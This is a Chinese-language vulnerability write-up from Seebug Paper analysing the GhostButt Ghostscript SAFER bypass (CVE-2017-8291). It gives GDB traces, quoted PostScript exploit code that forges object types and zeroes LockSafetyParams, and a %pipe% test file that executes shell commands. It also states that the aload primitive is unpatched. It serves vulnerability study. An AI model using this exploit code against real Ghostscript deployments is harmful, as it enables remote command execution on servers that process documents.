作者：[ **binjo**](http://weibo.com/binjo8)

  * GhostButt - CVE-2017-8291利用分析
  * .rsdparams Type Confusion?
  * .eqproc Type Confusion
  * aload Manipulating o_stack
  * SAFER Bypass
  * 后记
  * 禅(xian)定(zhe)时刻
  * 参考

# GhostButt - CVE-2017-8291利用分析

HipChat于2017年4月24日发出一篇博文1，
声明其检测到一起安全事件，一台云端Server受某第三方库存在的漏洞而被入侵。随后twitter网友根据其补丁情况2，猜测是Ghostscript的SAFER模式bypass。HD
Moore随后3建了个GhostButt.com网站4，使之成为又一个有名的漏洞。
Ghostscript是一个流行的PostScript语言的解析器，许多软件的某些组件都信赖它来完成相应功能，因而也会受Ghostscript漏洞影响。本文以Metasploit的相关exploit5为例进行深入分析，基于Ghostscript
9.21及Debain 64bit系统，读者可从Ghostscript官网下载存在漏洞的源码6。

推荐以debug模式编译，生成符号，方便后续调试。

    
    
    $ cd ghostscript-9.21
    $ ./autogen.sh
    $ make debug
    $ ./debugbin/gs --version
    9.21

## .rsdparams Type Confusion?

参照CVE-2017-8291在MITRE上的说明7，漏洞是在.rsdparams操作符中存在type confusion。

> Artifex Ghostscript through 2017-04-26 allows -dSAFER bypass and remote
> command execution via .rsdparams type confusion with a "/OutputFile (%pipe%"
> substring in a crafted .eps document that is an input to the gs program, as
> exploited in the wild in April 2017.

按其补丁8，可知.rsdparams
operator实现在psi/zfrsd.c中的zrsdparams函数中。然而，对zrsdparams下断点，却发现并没有命中，程序已经输出vulnerable字样了。

    
    
    $ gdb -q ./debugbin/gs
    Loaded 108 commands. Type pwndbg [filter] for a list.
    Reading symbols from ./debugbin/gs...done.
    pwndbg> set args -q -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f ../CVE-2017-8291.eps
    pwndbg> b zrsdparams
    Breakpoint 1 at 0x6e0c49: file ./psi/zfrsd.c, line 48.
    pwndbg> r
    Starting program: /root/Desktop/ghostscript-9.21/debugbin/gs -q -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f ../CVE-2017-8291.eps
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    [New process 24818]
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    process 24818 is executing new program: /bin/dash
    Error in re-setting breakpoint 1: Function "zrsdparams" not defined.
    vulnerable
    [Inferior 2 (process 24818) exited normally]

由exploit源码已知echo vulnerable是通过/OutputFile
%pipe%管道转向形成的，在源码中搜索pipe可知其实现在base/gdevpipe.c中的pipefope函数中，调用了popen。对popen设断点，观察调用栈可验证在#8
frame处zoutputpage函数即.outputpapge操作符调用时已经利用成功。

    
    
    pwndbg> b popen
    Breakpoint 1 at 0x116780
    pwndbg> r
    Starting program: /root/Desktop/ghostscript-9.21/debugbin/gs -q -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f ../CVE-2017-8291.eps
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Breakpoint 1, _IO_new_popen (command=0x55555705dc5e "echo vulnerable"..., mode=0x7fffffffc1a4 "w") at iopopen.c:273
    Breakpoint popen
    pwndbg> bt
    #0  _IO_new_popen (command=0x55555705dc5e "echo vulnerable"..., mode=0x7fffffffc1a4 "w") at iopopen.c:273
    #1  0x000055555566da63 in pipe_fopen (iodev=0x55555701c928, fname=0x55555705dc5e "echo vulnerable"..., access=0x7fffffffc1a4 "w", pfile=0x55555705ec70, rfname=0x0, rnamelen=0) at ./base/gdevpipe.c:60
    #2  0x0000555555aa7e99 in gx_device_open_output_file (dev=0x55555705a838, fname=0x55555705dc58 "%pipe%echo vuln"..., binary=1, positionable=0, pfile=0x55555705ec70) at ./base/gsdevice.c:1232
    #3  0x0000555555854b8b in gdev_prn_open_printer_seekable (pdev=0x55555705a838, binary_mode=1, seekable=0) at ./base/gdevprn.c:1294
    #4  0x0000555555853fbe in gdev_prn_output_page_aux (pdev=0x55555705a838, num_copies=1, flush=1, seekable=0, bg_print_ok=1) at ./base/gdevprn.c:1002
    #5  0x000055555585467a in gdev_prn_bg_output_page (pdev=0x55555705a838, num_copies=1, flush=1) at ./base/gdevprn.c:1149
    #6  0x00005555559ac1e4 in ppm_output_page (pdev=0x55555705a838, num_copies=1, flush=1) at ./devices/gdevpbm.c:315
    #7  0x0000555555aa50d5 in gs_output_page (pgs=0x555556ff8798, num_copies=1, flush=1) at ./base/gsdevice.c:210
    #8  0x0000555555c9a7f1 in zoutputpage (i_ctx_p=0x555557014d90) at ./psi/zdevice.c:369
    #9  0x0000555555c538b0 in do_call_operator (op_proc=0x555555c9a6fa <zoutputpage>, i_ctx_p=0x555557014d90) at ./psi/interp.c:86
    #10 0x0000555555c562f9 in interp (pi_ctx_p=0x555556fc4f30, pref=0x7fffffffcd90, perror_object=0x7fffffffce60) at ./psi/interp.c:1314
    #11 0x0000555555c5410a in gs_call_interp (pi_ctx_p=0x555556fc4f30, pref=0x7fffffffcd90, user_errors=1, pexit_code=0x7fffffffce78, perror_object=0x7fffffffce60) at ./psi/interp.c:511
    #12 0x0000555555c53f16 in gs_interpret (pi_ctx_p=0x555556fc4f30, pref=0x7fffffffcd90, user_errors=1, pexit_code=0x7fffffffce78, perror_object=0x7fffffffce60) at ./psi/interp.c:468
    #13 0x0000555555c459ec in gs_main_interpret (minst=0x555556fc4e90, pref=0x7fffffffcd90, user_errors=1, pexit_code=0x7fffffffce78, perror_object=0x7fffffffce60) at ./psi/imain.c:243
    #14 0x0000555555c46a16 in gs_main_run_string_end (minst=0x555556fc4e90, user_errors=1, pexit_code=0x7fffffffce78, perror_object=0x7fffffffce60) at ./psi/imain.c:661
    #15 0x0000555555c468e0 in gs_main_run_string_with_length (minst=0x555556fc4e90, str=0x555557019d50 "<2e2e2f4356452d"..., length=50, user_errors=1, pexit_code=0x7fffffffce78, perror_object=0x7fffffffce60) at ./psi/imain.c:619
    #16 0x0000555555c46852 in gs_main_run_string (minst=0x555556fc4e90, str=0x555557019d50 "<2e2e2f4356452d"..., user_errors=1, pexit_code=0x7fffffffce78, perror_object=0x7fffffffce60) at ./psi/imain.c:601
    #17 0x0000555555c4a45a in run_string (minst=0x555556fc4e90, str=0x555557019d50 "<2e2e2f4356452d"..., options=3) at ./psi/imainarg.c:979
    #18 0x0000555555c4a3d5 in runarg (minst=0x555556fc4e90, pre=0x555555de00a3 "", arg=0x7fffffffde99 "../CVE-2017-829"..., post=0x555555de025d ".runfile", options=3) at ./psi/imainarg.c:969
    #19 0x0000555555c4a0b0 in argproc (minst=0x555556fc4e90, arg=0x7fffffffde99 "../CVE-2017-829"...) at ./psi/imainarg.c:902
    #20 0x0000555555c4836a in gs_main_init_with_args (minst=0x555556fc4e90, argc=8, argv=0x7fffffffda88) at ./psi/imainarg.c:238
    #21 0x000055555566aa51 in main (argc=8, argv=0x7fffffffda88) at ./psi/gs.c:96
    #22 0x00007ffff67562b1 in __libc_start_main (main=0x55555566a9e0 <main>, argc=8, argv=0x7fffffffda88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffda78) at ../csu/libc-start.c:291
    #23 0x000055555566a8da in _start ()

所以，漏洞究竟在哪呢？在讲解具体漏洞前，为方便理解下文，先简单介绍一下postscript语言及Ghostscript解析postscript的操作数堆栈相关变量。
PostScript是一种图灵完全的编程语言，也是一种基于堆栈的解释语言9,
它类似于Forth语言但是使用从Lisp语言派生出的数据结构。代码示例请参考wikipedia中的具体描述，或其官方文档。postscript语言使用操作数堆栈(operator
stack)保存操作数，在Ghostscript实现中，变量名osbot，osp和ostop分别代表operator
stack的栈底、栈指针及栈顶，其堆栈是处于heap内存中，且从低地址向高地址生成、使用的。

## .eqproc Type Confusion

经过调试，漏洞就在.eqproc这个操作符的实现里，其调用方式如下，它从operator
stack上取得两个操作数，对其进行比较，再返回一个boolean值，压入operator stack栈。

    
    
    <proc1> <proc2> .eqproc <bool>

由于未对取得操作数的type进行验证，导致operator
stack上的任意操作数都可以拿来比较。有经验的读者可能已经发现问题所在，通过loop循环调用.eqproc，该type
confusion漏洞可以导致operator stack的堆栈指针上溢。注意上溢后，后续的操作数入栈等写入操作都可以认为是一个受限的写原语(write
primitive)。

    
    
    static int
    zeqproc(i_ctx_t *i_ctx_p)
    {
        os_ptr op = osp;
        ref2_t stack[MAX_DEPTH + 1];
        ref2_t *top = stack;
    
        make_array(&stack[0].proc1, 0, 1, op - 1);      // get two operands
        make_array(&stack[0].proc2, 0, 1, op);
        ......
        /* An exit from the loop indicates that matching failed. */
        make_false(op - 1);       // limited write primitive
        pop(1);
        return 0;
    }

## aload Manipulating o_stack

一个堆栈指针上溢能怎么利用呢？本exploit其实利用了另一个操作符aload，使得堆栈指针被更新到一个string
buffer后续的heap上，通过上溢及写原语，攻击者可以推断后续osp栈指针相对地址，从而通过string操作后续入栈的对象，改写其属性。个人认为，这是利用成功的关键，且并未得到修补。

    
    
    <array> aload <obj_0> ... <obj_n-1> <array>

当array实例的size超过当前operator
stack空余空间时，zaload会通过ref_stack_push调用进行内存分配，重新分配栈空间后改写堆栈指针osp。相关代码处于psi/zarray.c的zaload函数定义中。

    
    
    if (asize > ostop - op) {   /* Use the slow, general algorithm. */
        int code = ref_stack_push(&o_stack, asize);
        uint i;
        const ref_packed *packed = aref.value.packed;
    
        if (code < 0)
            return code;
        for (i = asize; i > 0; i--, packed = packed_next(packed))
            packed_get(imemory, packed, ref_stack_index(&o_stack, i));
        *osp = aref;
        return 0;
    }

代码虽少，不如调试器中看得直观。我们修改原exploit如下，添加print语句，调试器中设置断点在zprint，去GDB中一探究竟。

    
    
    buffers
    (xxx) print
    pop     % discard buffers on operator stack
    
    enlarge array aload
    (after aload) print

GDB中对zprint设断点，继续执行后，我们检查operator stack的栈底、栈指针及对应buffers在内存中的内容：

    
    
    pwndbg> b zprint
    Breakpoint zprint
    pwndbg> p osbot               // current operator stack bottom
    $2 = (s_ptr) 0x555556ffd7b8
    pwndbg> p osp                 // current operator stack pointer
    $3 = (s_ptr) 0x555556ffd7c8
    pwndbg> x/4gx osbot
    0x555556ffd7b8: 0x0000006f0000047e      0x0000555557291de0  // buffers
    0x555556ffd7c8: 0x0000000356fc127e      0x000055555784c7fd  // xxx string
    pwndbg> p r_type((ref *)$2) == t_array
    $4 = 1
    pwndbg> x/10gx 0x0000555557291de0 + 111*0x10 - 0x30         // 111 items
    0x5555572924a0: 0x0000fa0056fc127e      0x00005555578dc028
    0x5555572924b0: 0x0000fbf456fc127e      0x00005555578ee9c4
    0x5555572924c0: 0x0000fde856fc127e      0x0000555557901580  // last item
    0x5555572924d0: 0x0000000000000c00      0x0000000000000000
    0x5555572924e0: 0x0000002800000000      0x00005555560b6740
    pwndbg> x/10gx 0x0000555557901580 + 65000 - 0x30            // last item string buffer, size 65000
    0x555557911338: 0x0000000000000000      0x0000000000000000
    0x555557911348: 0x0000000000000000      0x0000000000000000
    0x555557911358: 0xffffffffffffffff      0xffffffffffffffff  // mark bytes
    0x555557911368: 0x0000000000000000      0x0000000000000000
    0x555557911378: 0x0000000000000000      0x0000000000000000

aload操作符执行完毕后，再次检查栈底和栈指针，可以确认均已经指向前面分配的string buffer内存之后了。

    
    
    pwndbg> c
    Breakpoint zprint
    pwndbg> p osbot
    $5 = (s_ptr) 0x555557914448       // osbot under 0x0000555557901580!!!
    pwndbg> p osp
    $6 = (s_ptr) 0x555557916178       // osp under 0x0000555557901580!!!
    pwndbg> x/2gx osp
    0x555557916178: 0x0000000b56fc127e      0x00005555572940c3
    pwndbg> p (char *)0x00005555572940c3
    $7 = 0x5555572940c3 "after aload\006?"

## SAFER Bypass

栈指针被重新分配后，便可以利用前述的.eqproc操作符进去上溢了。利用代码中，其分配了一个buffersearchvars
array来保存搜索用变量，循环检查所有buffers里的string字符串末尾的0xff是否被修改，从而判定上溢的栈指针osp到达可控范围，与string
buffer重叠。利用string buffer改写后续入栈的currentdevice对象属性，使之成为一个较大的string，保存至sdevice
array中，再覆盖其LockSafetyParams属性，达到SAFER模式bypass。该利用中分别覆写了内存偏移0x3e8，0x3b0和0x3f0处内容为0(false)，但在我的环境中，0x3b0和0x3f0处内容始终为0，估计是其它版本或系统中LockSafetyParams的偏移有所不同。

    
    
    {
        .eqproc
        buffersearchvars 0 buffersearchvars 0 get 1 add put
        buffersearchvars 1 0 put
        buffersearchvars 2 0 put
        buffercount {
            buffers buffersearchvars 1 get get
            buffersizes buffersearchvars 1 get get
            16 sub get
            254 le {    % 0xFF overwritten?
                buffersearchvars 2 1 put      % yes
                buffersearchvars 3 buffers buffersearchvars 1 get get put
                buffersearchvars 4 buffersizes buffersearchvars 1 get get 16 sub put
            } if
            buffersearchvars 1 buffersearchvars 1 get 1 add put
        } repeat
    
        buffersearchvars 2 get 1 ge {
            exit
        } if
        %(.) print
    } loop
    
    .eqproc
    .eqproc
    .eqproc
    sdevice 0         % store ref of converted device object
    currentdevice
    (before convert to string type) print
    buffersearchvars 3 get buffersearchvars 4 get 16#7e put         % 0x127e, string type
    buffersearchvars 3 get buffersearchvars 4 get 1 add 16#12 put
    buffersearchvars 3 get buffersearchvars 4 get 5 add 16#ff put   % size, 0xffxxxxxx
    (convert done) print
    put
    
    sdevice 0 get
    16#3e8 0 put      % LockSafetyParams offset
    
    sdevice 0 get
    16#3b0 0 put      % other version/os offset?
    
    sdevice 0 get
    16#3f0 0 put      % other version/os offset?
    
    (LockSafetyParams -> 0) print

话不多说，继续调试器中见真章。

    
    
    Breakpoint zprint
    pwndbg> p osp
    $8 = (s_ptr) 0x555557911368  // 栈指针上溢，与string buffer重叠
    pwndbg> x/4gx $8-1
    0x555557911358: 0xffffffffffff1378      0x000055555705a838  // 0xFF 已经被后续入栈的currentdevice覆盖
    0x555557911368: 0x0000001d56fc127e      0x000055555729409e
    pwndbg> p (char *)0x000055555729409e
    $9 = 0x55555729409e "before convert "...
    pwndbg> p r_type((ref *)0x555557911358) == t_device         // 当前依然是device对象
    $10 = 1
    pwndbg> p (gx_device *)0x000055555705a838
    $11 = (gx_device *) 0x55555705a838
    pwndbg> p $11->LockSafetyParams            // 表明处于SAFER模式中
    $12 = 1
    
    pwndbg> c
    Breakpoint zprint
    pwndbg> x/4gx osp-1
    0x555557911358: 0xffffffffffff127e      0x000055555705a838   // 0x127e 写入
    0x555557911368: 0x0000000c56fc127e      0x000055555729408a
    pwndbg> p r_type((ref *)0x555557911358) == t_string          // 成为string对象
    $13 = 1
    pwndbg> p/x r_size((ref *)0x555557911358)
    $14 = 0xffffffff
    pwndbg> p (char *)0x000055555729408a
    $15 = 0x55555729408a "convert done\261?"
    pwndbg> x/2gx 0x000055555705a838 + 0x3e8
    0x55555705ac20: 0x0000000000000001      0x0000000000000000   // 0x3e8处内存尚未改写
    
    pwndbg> c
    Breakpoint zprint
    pwndbg> x/2gx osp
    0x555557911338: 0x0000001556fc127e      0x000055555729406d
    pwndbg> p (char *)0x000055555729406d
    $16 = 0x55555729406d "LockSafetyParams -> 0\262?"
    pwndbg> x/2gx 0x000055555705a838 + 0x3e8
    0x55555705ac20: 0x0000000000000000      0x0000000000000000
    pwndbg> p (gx_device *)0x000055555705a838
    $17 = (gx_device *) 0x55555705a838
    pwndbg> p $17->LockSafetyParams     // 改写成功，SAFER bypassed
    $18 = 0

至此，SAFER模式bypass成功，但利用代码还需继续调用aload，重新分配栈空间以免garbage
collect时崩溃，最后通过.putdeviceparams设置好/OutputFile为(%pipe%echo vulnerable >
/dev/tty)字符串，并调用.outputpage飞向光明之巅！

## 后记

GhostButt利用一个type混淆漏洞，及operand
stack栈指针再分配指向可控内存，从而转化成栈指针上溢，使其可以混淆device对象为一个字符串，最终覆盖device的LockSafetyParams属性，达到SAFER模式bypass。其利用可以认为是TK教主的点穴大法，或者说yuange的DVE攻击。不到100行的postscript利用代码，精彩漂亮！而aload操作符的问题并没有被修补，配合其它漏洞，依然可以使用该方法进行利用。

许久没写文章，疏漏在所难免，欢迎到微博联系指正。[@binjo_](http://weibo.com/binjo8)
欢迎转发分享，或者打赏一杯咖啡钱。[二维码](https://images.seebug.org/1496117701549) :)

## 禅(xian)定(zhe)时刻

不指定-dSAFER模式下，device->LockSafetyParams默认是false，9.21版本下依然可以执行%pipe%管道命令，可是最新版本Ghostscript却不行了，这是为啥呢？

    
    
    $ cat /root/test.eps
    %!PS-Adobe-3.0 EPSF-3.0
    %%BoundingBox: -0 -0 100 100
    
    currentdevice null false mark /OutputFile (%pipe%echo vulnerable > /dev/tty)
    .putdeviceparams
    1 true .outputpage
    0 0 .quit
    
    $ ./debugbin/gs -q -dNOPAUSE -sDEVICE=ppmraw -sOutputFile=/dev/null -f /root/test.eps
    vulnerable
    
    $ cd /root/repos/ghostpdl
    $ git log -1
    commit 3ded6c3b28a1b183a492ada2f2a3970953f3d060
    Author: Henry Stiles <henry.stiles@artifex.com>
    Date:   Sun May 28 21:27:41 2017 -0600
    
        Increment the PJL stream pointer for illegal characters.
    
        When an illegal character is encountered within a PJL command we exit
        with end of job.  With recent changes it is necessary to increment the
        stream pointer as well because the PJL interpreter is reinvoked upon
        UEL resulting in an infinite loop.
    $ ./debugbin/gs -q -dNOPAUSE -sDEVICE=ppmraw -sOutputFile=/dev/null -f /root/test.eps
    Error: /undefined in .putdeviceparams
    Operand stack:
       --nostringval--   --nostringval--   false   --nostringval--   OutputFile   (%pipe%echo vulnerable > /dev/tty)
    Execution stack:
       %interp_exit   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--   --nostringval--   --nostringval--   false   1   %stopped_push   1967   1   3   %oparray_pop   1966   1   3   %oparray_pop   --nostringval--   1950   1   3   %oparray_pop   1836   1   3   %oparray_pop   --nostringval--   %errorexec_pop   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--    Dictionary stack:
       --dict:969/1684(ro)(G)--   --dict:0/20(G)--   --dict:82/200(L)--    Current allocation mode is local
    Current file position is 148
    GPL Ghostscript GIT PRERELEASE 9.22: Unrecoverable error, exit code 1

## 参考

1 <https://blog.hipchat.com/2017/04/24/hipchat-security-notice/>

2 <https://twitter.com/wdormann/status/857217642377216000>

3
<https://webcache.googleusercontent.com/search?q=cache:sWyjlQKRdxcJ:https://twitter.com/hdmoore/status/858093464663326721>

4 <http://ghostbutt.com/>

5 <https://github.com/rapid7/metasploit-framework/pull/8316>

6 <https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs921/ghostscript-9.21-linux-x86_64.tgz>

7 <http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-8291>

8
<https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=04b37bbce174eed24edec7ad5b920eb93db4d47d>

9 <https://zh.wikipedia.org/wiki/PostScript>

* * *

**欢迎扫描以下二维码赞赏作者（微信）** ![](https://images.seebug.org/1496117701549)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/310/>

